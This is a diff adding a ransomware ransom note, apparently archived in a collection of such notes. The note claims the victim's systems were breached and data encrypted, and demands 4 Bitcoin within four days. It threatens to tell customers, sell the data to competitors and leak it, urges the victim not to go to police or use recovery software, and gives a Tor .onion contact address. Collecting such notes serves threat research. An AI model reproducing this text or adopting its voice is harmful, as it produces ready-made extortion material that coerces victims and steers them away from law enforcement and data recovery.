@@ -1,0 +1,20 @@
+HI!
+Warning!
+Your systems have been compromised, and all important information has been extracted and encrypted.
+Consider us an unplanned, mandatory assessment of your network to identify vulnerabilities; we have no interest in destroying your files and only think of money.
+You have only 4 days to pay, and the requested ransom amount is 4 Bitcoins which is based on a detailed analysis of your financial information and assets.
+What happens if you don't pay the ransom?
+If you do not pay the ransom by the end of the specified time or use backup files to restore the data, the following steps will be taken automatically and step by step.
+1. We will notify your customers about your failure to protect their information, which will damage your reputation.
+2. All information will be sold to your competitors.
+3. All your information will be sold and published on the dark web.
+4. And finally, your information will be published on the internet.
+Be confident that if you decide not to cooperate with us, you will suffer damages far exceeding the amount we request, and we will obtain what we want by selling your files.
+Caution
+- Don't go to the police or security forces for help; they will try to prevent you from negotiating with us, and in the end, it's only your company that suffers the loss.
+- Do not modify encrypted files yourself
+- Do not use third-party software to restore your data; you may damage your files, which will result in permanent data loss.
+How to contact us?
+Install and run 'Tor Browser' from hxxps://www.torproject.org/download/
+Our URL is : http://l3e4ct2egnlfz4ymexwn66jlz55vrnnn72ub4u3xqdjcp7xel5hpbzqd.onion
+Log in using your client ID ([snip]) and stay in touch with us.
